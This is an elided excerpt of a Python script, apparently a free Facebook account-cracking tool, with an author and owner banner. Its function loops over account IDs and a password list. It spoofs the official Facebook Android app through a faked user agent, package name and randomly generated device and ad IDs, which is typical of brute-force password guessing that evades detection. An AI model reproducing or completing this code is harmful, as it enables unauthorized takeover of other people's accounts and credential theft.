...
----------------------------------------------
 Author    :     ZESHAN HASHIR 
 OWNER:   :      ZESHAN BALOCH
FACEBOOK :      ZESHAN BALOCH
FRIND     :     HASSAN X TAMOOR
TOOL      :           FREE
VERSION        0.2
\033[1;32m\033[1;37m☞  ZESHAN\x1b[38;5;208mAUTHER     \033[1;37m➣   \x1b[38;5;205m
----------------------------------------------
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua ='Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
